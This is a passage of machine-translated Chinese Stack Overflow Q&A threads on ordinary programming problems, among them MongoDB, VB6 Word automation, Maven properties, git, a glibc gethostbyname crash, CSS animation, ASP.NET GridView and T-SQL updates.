 "need remove or update", "ok" : 0 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-01-12T07:57:19.313

您使用的是哪个版本的 MongoDB？在最新版本中，MongoDB 期望在 findAndModify 命令中明确提及“更新”或“删除”。请改用以下查询。

```
db.collectionName.findAndModify({
  query : {
    'code':code,
    'email':email
  },
  update: {
     $pull : {'object.array_doc':{'code_doc':code_doc} }
  }
}) 
```

# vb6 - 使用 VB6 从一个文档粘贴到另一个文档后，Word 文档中的边距不正确

> ID：15110377
> 
> 赞同：1
> 
> 时间：2013-02-27T11:00:37.103
> 
> 标签：vb6, ms-word, interop

我继承了一个 VB6 应用程序，我可以在其中的一部分方面提供一些帮助。

该代码打开一个 word 文档并复制其内容。完成后，它将打开另一个文档并将第一个文档中的内容粘贴到第二个文档中。打开，复制和粘贴工作正常，问题在于粘贴文本的格式及其后面的分节符。不是在分节符之后直接出现，而是放在另一页上，但分节符仍然说它是连续的。我做了一些挖掘并尝试了下面所说的

[粘贴时停止边距调整 - Microsoft Community](http://answers.microsoft.com/en-us/mac/forum/macoffice2011-macword/stop-margin-adjustment-when-pasting/04dacd1d-105a-4f14-a89d-508bfcb0d6fa?msgId=10d2d3ed-b7f3-4eb2-a1cb-17c50cc0fdc2)

[将文档复制并粘贴到模板时出现边距问题 - Microsoft Community](http://answers.microsoft.com/en-us/office/forum/office_2010-word/problem-with-margins-when-i-copy-paste-a-document/b1e4c067-9395-465f-a8f0-a6073f590893)

[分节符导致 word 中出现意外的分页符](http://support.microsoft.com/?kbid=292074)

[分页符和分节符疑难解答 - Word - Office.com](http://office.microsoft.com/en-gb/word-help/troubleshoot-page-breaks-and-section-breaks-HP005188558.aspx)

这些都没有帮助。代码的精简版如下：

```
 GetWord97Object objWordApp

objWordApp.Visible = True
objWordApp.documents.Open strCopyFromDoc

DeleteHeadersAndFooters objWordApp.documents(strCopyFromDoc)

objWordApp.documents(strCompyFromDoc).content.Copy

objWordApp.documents.Open strCopyToDoc
objWordApp.documents(strCopyToDoc).characters(objWordApp.ActiveDocument.characters.Count).Select

Set objRng = objWordApp.ActiveDocument.content   ' Range used so as not to overwrite original text
objRng.Collapse Direction:=0

If IsWordAppVersionLessThan2002(CInt(objWordApp.Version)) Then
    objRng.Paste
Else
    objRng.PasteAndFormat wdPasteDefault
End If 
```

我试过粘贴和格式化，但没有帮助。我使用的 Word 版本是 2002 SP3，但我需要它与 2002 及更高版本一起使用。VB6 为 SP6。

在此先感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-28T09:46:41.493

我设法摆脱了这个问题。看起来这与文档有关，而不是与代码有关。我已经将页眉和页脚从一个文档复制到另一个文档，这一次似乎奏效了。以前的复制尝试似乎没有任何区别。不是一个理想的解决方案，但至少它是排序的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-08-18T15:44:14.030

我找到了解决方案，而且我认为它更简单。只需在粘贴内容之前保存文档。这使得 Word 保留原始边距定义。在我的代码中，我做到了。

```
Private Sub CommandButton4_Click()
Dim Item As String
Dim i As Integer
For i = 0 To ProcList.ListCount - 1
Dim docNew As Document
Dim docproc As Document
Set docNew = Word.ActiveDocument
docNew.Content.Copy
Set docproc = Documents.Add

With docproc
        .SaveAs FileName:=ProcList.List(i)
        Selection.ClearParagraphAllFormatting
        Selection.Paste

End With

Next i" 
```

# maven - ANT 中的 project.build.directory 是什么

> ID：15110390
> 
> 赞同：2
> 
> 时间：2013-02-27T11:01:14.033
> 
> 标签：maven, ant, build, maven-antrun-plugin

在我的项目中，使用了 maven-antrun-plugin，并且在许多地方使用了一个名为

> 项目.build.目录

被引用，但我无法理解该属性设置的值。我试图用谷歌搜索并找到几个提到这一点的地方，但找不到关于这个属性设置的正式说明。

另外，由于我使用的是 maven-antrun-plugin，如果你告诉我这个属性是由 Maven 或 Ant 设置的，那就太好了。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T11:10:32.437

`project.build.directory`当您的 ant 脚本嵌入到 pom.xml 中时，它是一个可用的 maven 属性

如果你调用一个外部的 ant 构建文件，这个属性将在`maven.project.build.directory`

默认情况下，此属性的值是`target`目录。

可以通过在pom.xml`<directory>`的部分中添加一个元素来更改此默认值：`<build>`

```
<build>
    <directory>something</directory>
    ...
</build> 
```

有关 maven-antrun-plugin 中的 maven 属性的更多信息，请[点击此处](http://maven.apache.org/plugins/maven-antrun-plugin/usage.html)

来自此来源的具体报价：

> maven 可用的所有属性在目标配置中也可用。但是，您可能希望使用 ant 任务调用外部 Ant 构建脚本。为避免名称冲突，仅将一部分属性传递给外部 Ant 构建。这些包括在 POM 的属性部分中定义的所有属性。它还包括一些常用 Maven 属性的前缀版本。

# pinterest - Pinterest pinit 按钮未计数

> ID：15110392
> 
> 赞同：-1
> 
> 时间：2013-02-27T11:01:16.633
> 
> 标签：pinterest

我添加了一个 pinit 按钮，但它没有得到计数。

```
<a data-pin-config="beside" always-show-count="true" data-pin-do="buttonBookmark" href="//pinterest.com/pin/create/button/"><img src="//assets.pinterest.com/images/PinExt.png" /></a>
<script src="//assets.pinterest.com/js/pinit.js"></script> 
```

![在此处输入图像描述](../Images/191feb5c98f324aaed85bdd8371ba354.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:10:08.703

我希望你是故意这样做的，但只是为了确定：

您的`href=//pinterest.com/pin/create/button/`链接缺少该`?url=http://your_url_here`部分。pinterest 如何知道您要链接到哪个页面（并获得计数）？

查看此页面上的 pinit 生成器：http: [//business.pinterest.com/widget-builder/#do_pin_it_button](http://business.pinterest.com/widget-builder/#do_pin_it_button)

正确的版本看起来更像这样：

```
<a data-pin-config="beside" 
  href="//pinterest.com/pin/create/button/?url=http%3A%2F%2Fwww.flickr.com%2Fphotos%2Fkentbrew%2F6851755809%2F&media=http%3A%2F%2Ft1.gstatic.com%2Fimages%3Fq%3Dtbn%3AANd9GcS6QBH2vJzx6BnYN_CACYuThsx4jL6MILcVHfFg6n-CX3CD5rq7ow&description=Next%20stop%3A%20Pinterest" 
  data-pin-do="buttonPin" >
    <img src="//assets.pinterest.com/images/pidgets/pin_it_button.png" />
</a> 
```

如果我遗漏了 ?url en ?media 变量我的 pin'it！按钮也不起作用:)。

# android - 如何在sqlite android中保存经纬度gps？

> ID：15110404
> 
> 赞同：-3
> 
> 时间：2013-02-27T11:01:56.257
> 
> 标签：android, sqlite, gps

如何保存每给定一小时在数据库sqlite中更改的位置的坐标gps纬度和经度。

这是我的代码，

```
public void onLocationChanged(  final Location location) { 
        Log.e("GPS", "Latitude " + location.getLatitude() + " et longitude " + location.getLongitude());
         BDHandler = new DatabaseHandler(null);
         db = BDHandler.getWritableDatabase();
     Thread th= new Thread() {
         public void run()
         {

         ContentValues value = new ContentValues();
            value.put("LONGITUDE", Double.toString(location.getLatitude()));
            value.put("LATITUDE", Double.toString( location.getLongitude()));
            { try
            {
         while(true)
         {
             Thread.sleep(360000);
             {
                 db.insert("Table_name", null, value);
             }
         }

            }
            catch(Exception e) 
            {
                e.printStackTrace();
            } 
            }
         }

         };
            th.start();

        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:18:11.353

您将 lat/long 存储为使用至少三倍所需空间的字符串。通过将img与1e7相乘，将它们存储为float或更好的int。

# php - MySQL表以指数格式存储大值

> ID：15110408
> 
> 赞同：0
> 
> 时间：2013-02-27T11:02:03.140
> 
> 标签：php, mysql

在插入 mysql 表时，它将 1000000000 转换为 1e+09 等等。

插入是通过**INSERT**查询进行的

> 字段数据类型是浮点数

和

> 数据库引擎是 InnoDB

这是 Debian 服务器上的实时数据库，尽管当数据库在 Amazon 服务器上时，相同的**INSERT**查询正确保存 1000000000。很奇怪 ：（

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:21:24.767

`1e+9`是`1000000000`。用于`number_format()`以普通表示法显示值。

# c# - 确定用于 WPF 弹出窗口的 CustomPopupPlacement

> ID：15110410
> 
> 赞同：0
> 
> 时间：2013-02-27T11:02:09.023
> 
> 标签：c#, wpf, xaml, popup

我试图弄清楚`CustomPopupPlacement`在弹出窗口实际呈现时使用了哪些传入的位置数组。有什么事件可以检测到这一点吗？

这个 2009 年的 msdn 线程似乎正是我的问题，但似乎没有答案。

[http://social.msdn.microsoft.com/Forums/da/wpf/thread/4c6d216a-0011-4202-aa7e-2fccef3cc355](http://social.msdn.microsoft.com/Forums/da/wpf/thread/4c6d216a-0011-4202-aa7e-2fccef3cc355)

标记的答案似乎无效，我的情况与线程中的 OP 完全相同。

我将弹出带有 4 条路径的弹出窗口，并使用 DP 切换三个路径的可见性，以选择要渲染的正确箭头路径。

因此，鉴于我们通过委托提供了 4 个放置选项`CustomPopupPlacementCallback`，有没有办法检测系统在处理屏幕边缘情况和排序后最终选择的 4 个位置中的哪一个。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-11-20T16:03:37.783

找到弹出窗口位置的更好方法。此方法需要存在 Child 元素，但考虑到 Popup 元素附带的 Grid，这没有问题。

```
 UIElement container = VisualTreeHelper.GetParent(this) as UIElement;
    Point relativeLocation = this.Child.TranslatePoint(new Point(0, 0), container); //It HAS(!!!) to be this.Child

    if (relativeLocation.Y < 0) //or use X for left and right
    {
        Console.WriteLine("TOP PLACEMENT!");
    }
    else
    {
        Console.WriteLine("BOTTOM PLACEMENT!");
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-13T16:22:49.237

我有一个小技巧。将自定义点保存为派生的 TooTip 类中的字段并覆盖 OnOpened 方法。

```
protected override void OnOpened(RoutedEventArgs e)
{
    base.OnOpened(e);
    var p = this.TranslatePoint(new Point(0, 0), this.PlacementTarget);
    var diff1 = this.first - p;
    var diff2 = this.second - p;

    if (Math.Abs(Math.Min(diff1.Length, diff2.Length) - diff1.Length) < 0.01)
    {
        // First Point
    }
    else
    {
        // Second Point
    }
} 
```

欢迎更好的解决方案

# linux - Git：使用 && 一次性重置和结帐不起作用

> ID：15110413
> 
> 赞同：0
> 
> 时间：2013-02-27T11:02:17.037
> 
> 标签：linux, git, version-control

简单的 git 问题。执行后：

```
git reset HEAD file && git checkout -- file 
```

该文件仍在“未暂存以进行提交的更改”部分下，但不应该。如果我分别执行这两个操作（即按回车键并查看它们之间和之后的 git 状态），它就可以工作。

**平台：** Linux amd64，git版本1.8.1.3

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:07:33.307

这是因为`git reset`当文件在重置后有未暂存的提交时返回非零退出代码。所以`&&`阻止`git checkout`运行 - 如果第一个“成功”（即以零退出），它将只运行第二个命令。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T19:02:33.400

`git reset HEAD file`只需更新索引（即，文件的任何分阶段更改都会丢失），更改后的文件保持原样。

为什么要这样做，如果一个简单的`git checkout file`（也许用`-f`if`file`已经改变）完成了同样的事情？

# c - gethostbyname() 错误 - 与内存管理有关的内容

> ID：15110423
> 
> 赞同：2
> 
> 时间：2013-02-27T11:03:15.650
> 
> 标签：c, out-of-memory, gethostbyname

我正在尝试在 C 中使用 gethostbyname() 函数进行网络分配。

当我尝试这样做时

```
struct hostent *host;
char* addr = malloc (10*sizeof(char));  
strcpy (addr, "localhost");  
host= (struct hostent *) gethostbyname(addr); 
```

我收到以下错误。

```
glibc detected ./Sender: free(): invalid next size (normal): 0x0000000001584480 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x7eb96)[0x7fcdbaca4b96]
/lib/x86_64-linux-gnu/libc.so.6(fclose+0x155)[0x7fcdbac94815]
/lib/x86_64-linux-gnu/libc.so.6(+0x103b16)[0x7fcdbad29b16]
/lib/x86_64-linux-gnu/libc.so.6(__res_maybe_init+0x125)[0x7fcdbad2b3d5]
/lib/x86_64-linux-gnu/libc.so.6(__nss_hostname_digits_dots+0x3d)[0x7fcdbad2db0d]
/lib/x86_64-linux-gnu/libc.so.6(gethostbyname+0x8b)[0x7fcdbad32b7b]
./Sender[0x401858]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xed)[0x7fcdbac4776d]
./Sender[0x400a09]
======= Memory map: ========
00400000-00403000 r-xp 00000000 08:07 3573874                            /home/karthik/courses/Sem 6/Networks/Lab/lab4/Sender
00602000-00603000 r--p 00002000 08:07 3573874                            /home/karthik/courses/Sem 6/Networks/Lab/lab4/Sender  
00603000-00604000 rw-p 00003000 08:07 3573874                            /home/karthik/courses/Sem 6/Networks/Lab/lab4/Sender
01584000-015a5000 rw-p 00000000 00:00 0                                  [heap]
7fcdbaa10000-7fcdbaa25000 r-xp 00000000 08:08 525634                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fcdbaa25000-7fcdbac24000 ---p 00015000 08:08 525634                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fcdbac24000-7fcdbac25000 r--p 00014000 08:08 525634                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fcdbac25000-7fcdbac26000 rw-p 00015000 08:08 525634                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fcdbac26000-7fcdbaddb000 r-xp 00000000 08:08 541113                     /lib/x86_64-linux-gnu/libc-2.15.so
7fcdbaddb000-7fcdbafda000 ---p 001b5000 08:08 541113                     /lib/x86_64-linux-gnu/libc-2.15.so
7fcdbafda000-7fcdbafde000 r--p 001b4000 08:08 541113                     /lib/x86_64-linux-gnu/libc-2.15.so
7fcdbafde000-7fcdbafe0000 rw-p 001b8000 08:08 541113                     /lib/x86_64-linux-gnu/libc-2.15.so
7fcdbafe0000-7fcdbafe5000 rw-p 00000000 00:00 0 
7fcdbafe5000-7fcdbb007000 r-xp 00000000 08:08 545991                     /lib/x86_64-linux-gnu/ld-2.15.so
7fcdbb1e4000-7fcdbb1e7000 rw-p 00000000 00:00 0 
7fcdbb203000-7fcdbb207000 rw-p 00000000 00:00 0 
7fcdbb207000-7fcdbb208000 r--p 00022000 08:08 545991                     /lib/x86_64-linux-gnu/ld-2.15.so
7fcdbb208000-7fcdbb20a000 rw-p 00023000 08:08 545991                     /lib/x86_64-linux-gnu/ld-2.15.so
7fff5c673000-7fff5c695000 rw-p 00000000 00:00 0                          [stack]
7fff5c7ff000-7fff5c800000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
Aborted (core dumped)` 
```

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T13:09:47.757

您的代码中某处存在内存损坏，其中一部分您可能没有显示。由于您的代码段不是有效的 C，我假设您手动键入它或复制它不完整。

要调试此类场景，如果您在支持它的平台上（如您所愿），请使用[DrMemory](http://www.drmemory.org/)或[Valgrind](http://valgrind.org/)。我更喜欢 Valgrind 的功能，而 DrMemory 可以说更快。

这两个程序都能够查明问题，甚至在有问题的程序仍在运行时将您连接到调试器。因此，您可以检查实时程序中的错误情况。

* * *

旁注：如果您不必以任何方式组合名称，则可以将其作为文字字符串传递给`gethostbyname`：

```
struct hostent *host;
host = (struct hostent *) gethostbyname("localhost"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T13:28:06.090

第一行缺少尾随`;`.

如果不是 OP 真的在使用可能未初始化`address`的而不是`addr`这闻起来就像在实际调用`gethostbyname()`.

在假设下

*   的使用`address`是一个错字和
*   `<netdb.h>`被`#include`编辑

除了缺少对`malloc()`' 成功的检查外，OP 的代码是正确的。

可能看起来像这样：

```
#include <netdb.h>

...

struct hostent * host = NULL;
char * addr = malloc (10 * sizeof(*addr));  
if (!addr)
  perror("malloc");
else 
{
  strcpy (addr, "localhost");  
  host = gethostbyname(addr);  
  ... 
```

所以你可能喜欢使用内存检查器`valgrind`，看看出了什么问题。

# html - 段落的替代颜色

> ID：15110425
> 
> 赞同：0
> 
> 时间：2013-02-27T11:03:18.893
> 
> 标签：html, css

我想改变段落的颜色来吸引顾客。我的代码如下

```
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
  <head>
    <title>hhjl</title>
  </head>
  <body>
    <p style="color: blue;"><b>Hello</b></p>
  </body>
</html> 
```

段落的当前颜色是蓝色，但我想将其更改为红色/绿色等以吸引人。我在这里不使用闪烁，而是尝试使用更改单词的颜色。怎么做？。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:13:56.430

您可以使用动画来更改颜色：

```
p{
    color:blue;    
      -webkit-animation: color 1s linear 0s infinite alternate;
     -moz-animation: color 1s linear 0s infinite alternate;
          animation: color 1s linear 0s infinite alternate;
}

@-webkit-keyframes color { from { color:blue; } to { color:red; }  }
   @-moz-keyframes color { from { color:blue; } to { color:red; }  }
        @keyframes color { from { color:blue; } to { color:red; }  } 
```

看看**[演示](http://jsfiddle.net/6ytAk/1/)**。

资源：

[https://developer.mozilla.org/en-US/docs/CSS/@keyframes](https://developer.mozilla.org/en-US/docs/CSS/@keyframes)
[https://developer.mozilla.org/en-US/docs/CSS/animation](https://developer.mozilla.org/en-US/docs/CSS/animation)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:11:03.907

```
<p style="color: red;"><b>Hello</b></p>

<p style="color: green;"><b>Hello</b></p> 
```

根据您要使用的颜色更改每个段落的颜色。您还可以从[http://www.w3schools.com/html/html_colors.asp中选择丰富的颜色代码](http://www.w3schools.com/html/html_colors.asp)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:09:26.583

将段落放在 div 之间，然后用 css 设置该 div 的颜色。另一个更简单的选择是使用类似的东西，`<p style="color:cyan;">`或者您可以使用 RGB 指定颜色。

# jsf - 富：列的 f:facet 中的 outputText 和 inputText 不起作用 - JSF

> ID：15110426
> 
> 赞同：0
> 
> 时间：2013-02-27T11:03:21.573
> 
> 标签：jsf, richfaces

我正在尝试使用具有排序能力的 rich:dataTable 来实现外部过滤。

这是我尝试过的：

```
<rich:column sortBy="#{data.name}" id="name" filterMethod="#myBean.filter}">
                <f:facet name="header">
                    <h:outputText value="Name" />
                    <h:inputText value="#{myBean.currentName}"
                        id="nameFilterInput" onclick="Event.stop(event)" onkeypress="searchNameOnEnter(event, this);">
                                        <a4j:support event="onkeyup" reRender="dataTable , ds"
                                            ignoreDupResponses="true" requestDelay="700" />
                                    </h:inputText>
                </f:facet>
                <h:outputText value="#{data.name}" />
</rich:column> 
```

**问题**：输入文本字段覆盖了输出文本（标题名称）

我尝试在 f:facet 中使用 h:panelGroup，但问题是排序图标单独呈现在第三行。

我在这里想念什么？任何帮助都会很棒。

**更新**：@Christophe Roussy，这是截图 ![截屏](../Images/3018e6670e26937250aad36504aa08ee.png)

正如所见，inputText 正在覆盖 outputText。

**更新 2**：我在这里看到了一个帖子：[https](https://community.jboss.org/thread/13046) ://community.jboss.org/thread/13046，它解释了`<f:facet name="filter">`用于 inputText，但这似乎只适用于rich:extendedDataTable。有什么方法可以让它与rich:dataTable一起工作？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T12:32:49.023

`<f:facet>`只能生一个孩子。将它们包裹在一个`<h:panelGroup>`.

```
<f:facet name="header">
    <h:panelGroup>
        <h:outputText ... />
        <h:inputText ... />
    </h:panelGroup>
</f:facet> 
```

# jquery - 使用jquery将行添加到gridview

> ID：15110427
> 
> 赞同：0
> 
> 时间：2013-02-27T11:03:23.277
> 
> 标签：jquery, asp.net, gridview

最初我的gridview与一个数据绑定，当用户单击添加更多按钮时，我一次通过jquery将一行添加到gridview。我的代码工作正常，但问题是当我通过 jquery 从客户端向 gridview 添加 5 行时，当我尝试从服务器端迭代这些行时，`GridView1.Rows.Count`总是返回一行。所以我的问题是，当 jquery 从客户端添加行时，我无法从服务器端迭代行集合。所以在这里我给出我的整个代码，只是告诉我我能做什么，结果我将能够在通过 jquery 添加这些行后从服务器端读取所有行。

## ASPX

```
<script>
     $(document).ready(function () {
        $("#datepicker").datepicker({ 
            dateFormat: 'dd/mm/yy',
            showOn: "both",
            buttonImageOnly: true,
            buttonImage: "images/date_picker.gif",
            buttonText: "Calendar"
         });

        $('#<%=btnAdd.ClientID %>').bind('click', function (event) {
            var $grid = $('#<%=GridView1.ClientID %>');
            var $row = $grid.find('tr:last').clone().appendTo($grid);
            $row.find('select')[0].selectedIndex = 0;
            return false;
        });
    });
</script>

<asp:Button ID="btnAdd" Text="Add More" runat="server" /><br />
<asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="False" ShowHeader="False">
       <Columns>
           <asp:TemplateField>
               <ItemTemplate>
                   <asp:DropDownList ID="ddlCountry" runat="server">
                    <asp:ListItem>--Select--</asp:ListItem>
                    <asp:ListItem>India</asp:ListItem>
                    <asp:ListItem>UK</asp:ListItem>
                    <asp:ListItem>USA</asp:ListItem>
                    <asp:ListItem>Germany</asp:ListItem>
                </asp:DropDownList>

    <asp:DropDownList ID="ddlCity" runat="server">
                    <asp:ListItem>--Select--</asp:ListItem>
                    <asp:ListItem>Kolkata</asp:ListItem>
                    <asp:ListItem>Mumbai</asp:ListItem>
                    <asp:ListItem>Delhi</asp:ListItem>
                    <asp:ListItem>Madras</asp:ListItem>
                </asp:DropDownList>
               </ItemTemplate>
           </asp:TemplateField>
       </Columns>
   </asp:GridView>
<br /><br />
<asp:Button ID="Button1" Text="Read gridview Value" runat="server" 
    onclick="Button1_Click" /><br /> 
```

## 服务器端代码

```
protected void Page_Load(object sender, EventArgs e)
        {
            if (!IsPostBack)
            {
                DataTable dt = new DataTable();
                dt.Columns.Add("ID", typeof(string));
                DataRow dr = dt.NewRow();
                dr["ID"] = "";
                dt.Rows.Add(dr);
                GridView1.DataSource = dt;
                GridView1.DataBind();
            }
        }

        protected void Button1_Click(object sender, EventArgs e)
        {
            StringBuilder sb=new StringBuilder();

            //HtmlTable table = (HtmlTable)rpt.Items[0].FindControl("tblSample");

            for (int i = 0; i <= GridView1.Rows.Count - 1; i++)
            {
                string country = ((DropDownList)GridView1.Rows[i].FindControl("ddlCountry")).SelectedItem.Text;
                string city = ((DropDownList)GridView1.Rows[i].FindControl("ddlCity")).SelectedItem.Text;
                sb.Append("Country :- " + country + "  City :- " + city);
            }
            txtData.Text = sb.ToString();
        } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:20:33.150

您无法读取从 javascript 添加的服务器代码中的行。相反，您需要从服务器代码中添加行。因为在单击按钮时，它会发回服务器。添加到 javascript 代码上的行将不会使用 viewstate 呈现。它不会添加到视图状态。所以在回发它不会呈现。所以不可能在javascript上添加它。它只能用于显示目的。您可以对此类操作使用 ajax 部分回发。它通过更新面板及其触发过程完成。

[使用此 url 获取类模型的详细信息](http://www.aspdotnet-suresh.com/2012/03/bind-data-to-gridview-with-jquery-or.html)

# c++ - glibc2.5 的 MySQL 客户端库可以在 glibc 版本 < 2.5 的 Linux 机器上工作吗？

> ID：15110429
> 
> 赞同：0
> 
> 时间：2013-02-27T11:03:31.973
> 
> 标签：c++, glibc, mysql

如果我想将使用 MySQL C 库 (libmysqlclient.so) 的应用程序与使用 glibc2.5 编译的二进制文件打包并发布，它是否适用于安装了 linux 2.3 左右的旧 linux 机器？或者行为是完全不确定的？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T13:53:23.563

Linux 和 glibc 是两个不同的东西。在您的标题中，您声明您服务器上的 glibc 版本为 2.5 或更低。但是，在您的问题中，您说您拥有 Linux 2.3。在您的问题中，您实际上并未说明 Linux 服务器上的 glibc 版本。

理论上，您可以在 Linux 内核版本上安装 glibc 版本 4。实际上，glibc 通常需要某个版本的内核才能安装。查看 glibc 2.5 的发行说明，似乎最低内核版本是 2.6.0，因此您的服务器不太可能安装 glibc 2.5。

无论哪种方式，真正的问题是：您的 Linux 服务器上的 glibc 版本是什么。如果您的 Linux 服务器的版本比 glibc2.5 旧，您将无法运行针对新版本构建的任何内容。

所以，总而言之，不，您可能无法运行 MySQL C 库。

现在，说了这么多，在我看来，您不太可能拥有安装了 Linux 2.3 的 Linux 服务器。2.3 不仅很老（到现在 12-13 年），它还是 Linux 内核的开发版本。事实上，如果您说您的 Linux 服务器具有 glibc 2.3，那么您应该检查内核版本。如果内核版本至少为 2.6.0（2004 年发布），那么您可能能够将 glibc 升级到 2.5，从而运行 MySQL 库。

# sql-server - 免费的 SQL Server 2005 自动竞赛工具

> ID：15110430
> 
> 赞同：0
> 
> 时间：2013-02-27T11:03:33.460
> 
> 标签：sql-server, sql-server-2005

SQL Server 2005 的 SQL Prompt 是否有免费或非常便宜的替代方案？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T11:10:19.373

您可以尝试[ApexSQL Complete](http://www.apexsql.com/sql_tools_complete.aspx)或[SSMS Toolpack](http://www.ssmstoolspack.com/)。

# tsql - 通过取自另一个表的值更新多行

> ID：15110433
> 
> 赞同：0
> 
> 时间：2013-02-27T11:03:35.867
> 
> 标签：tsql, sql-update

到目前为止，这是我能掌握的：

```
declare @i int = 7;
declare @lat float;
declare @lng float;
declare @point ???; -- what type?

declare @location table(lat float, lng float)

insert @location values (32.097218, 34.770438199999944)
insert @location values (32.083847, 34.775618)
insert @location values (32.1600788, 34.771902)
insert @location values (31.9914283, 34.80780099999993)
insert @location values (32.1574281, 34.775191800000016)
insert @location values (29.5543212, 34.89448429999993)
insert @location values (32.8018919, 34.96268420000001)

while @i > 0
    begin
            -- this is a wrong way to do it
        set @point = (select top (1) * from @location);
            -- must set @lat and @lng here somehow, based on the
            -- one row selected above. Deleting here is not
            -- mandatory, but may be used, if needed.
        delete top (1) from @location;
        update top (1) rest_tbl
        set lat = @lat, lng = @lng
        where lat is null and private_label_id = 3
        set @i = @i - 1
    end; 
```

请不要介意我创建`@location`变量的部分——在现实世界中，它是一个实际的表，我只是将它用于 PoC。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:20:10.373

我认为`Cursor`在这件事上使用会有所帮助

```
DECLARE db_cursor CURSOR FOR (Select  lat,lng  from @location
where lat not in (Select lat from rest_tbl where lat is not null));

DECLARE @lat Float;
DECLARE @lng Float;

OPEN db_cursor;
FETCH NEXT FROM db_cursor INTO @lat,@lng;
WHILE @@FETCH_STATUS = 0  
BEGIN  
        UPDATE top (1) rest_tbl
        SET  lat =@lat,lng =@lng
        where lat is null

       FETCH NEXT FROM db_cursor INTO @lat,@lng;
END;
CLOSE db_cursor;

Delete from  @location
    where lat in (Select lat from rest_tbl where lat is not null) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T12:44:11.740

我认为这就是你所需要的。如果你在，`sql-server 2005 or above`你可以使用`CTE`和`row_number()`运行如下没有循环。请*`cols_that_decides_order`*用正确的列替换以获得最高记录。

此外，我认为您`lng`在转换为浮点数时会被四舍五入（例如；`34.770438199999944 >> 34.7704382`）。

```
--Declare the table with auto incremented identity with seed=7 and increment = -1.
declare @location table(mykey int identity(7,-1), lat float, lng float)

insert @location values (32.097218, 34.770438199999944)
                       ,(32.083847, 34.775618)
                       ,(32.1600788, 34.771902)
                       ,(31.9914283, 34.80780099999993)
                       ,(32.1574281, 34.775191800000016)
                       ,(29.5543212, 34.89448429999993)
                       ,(32.8018919, 34.96268420000001)

;with cte as (
   select lat,lng, row_number() over (order by cols_that_decides_order) rn
   from rest_tbl
   where lat is null and private_label_id = 3
)
update c set c.lat = t.lat, c.lng = t.lng
from cte c join @location t on c.rn = t.myKey 
```

# iphone - UIScrollView 自定义大小（没有得到）

> ID：15110434
> 
> 赞同：0
> 
> 时间：2013-02-27T11:03:36.300
> 
> 标签：iphone, uiscrollview, xcode4.5

我有一个`UIScrollView`附加到一个`UIView`using `interfacebuilder`，到`UIScrollView`我添加`subviews`的 ,`UILabels`等`UIButtons`。

在我的 .m 文件中，我给出了这样的

```
[testscroll setScrollEnabled:YES];

[self.testscroll setContentSize:CGSizeMake(320, 1560)]; 
```

我可以看到`UIScrollView`但已达到极限（不适用于总视图）我增加了高度`setContentSize`但没有用

我认为这是一个简单的问题，但没有得到它，请帮助我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T13:38:35.050

查看这些情况，这可能会有所帮助，
1>首先检查您是否正确绑定了滚动视图。
2>如果你创建了滚动视图的属性，那么只能使用 self. testscroll
3>在 ViewdidLoad 中设置内容大小

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:09:56.833

检查 IB 处的滚动高度。如果视图高度和滚动内容高度相同，则滚动不会滚动。检查 IB 处的滚动高度并相应减小

# javascript - 如何在选中的复选框数组javascript上获取长度

> ID：15110437
> 
> 赞同：15
> 
> 时间：2013-02-27T11:03:43.243
> 
> 标签：javascript, jquery, checkbox

```
<form name='form1' >
   <input type=checkbox name='cbox[]' />
</form>

<script>    
   var checkbox = document.getElementsByName('ckbox[]')
   var ln = checkbox.length
   alert(ln)
</script> 
```

如何使用 JavaScript 或 jQuery 只计算选中的复选框？

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2013-02-27T11:06:18.143

用 jQuery 来做这件事会缩短代码，使其更具可读性、可维护性和更容易理解。将[属性选择器](http://api.jquery.com/attribute-equals-selector/)与[:checked](http://api.jquery.com/checked-selector/)选择器一起使用

**[现场演示](http://jsfiddle.net/L25NB/)**

```
$('[name="cbox[]"]:checked').length 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-02-27T11:07:08.027

如果你想使用纯 JavaScript

```
var checkbox = document.getElementsByName('ckbox[]');
var ln = 0;
for(var i=0; i< checkbox.length; i++) {
    if(checkbox[i].checked)
        ln++
}
alert(ln) 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-02-27T11:05:32.613

jQuery解决方案：

```
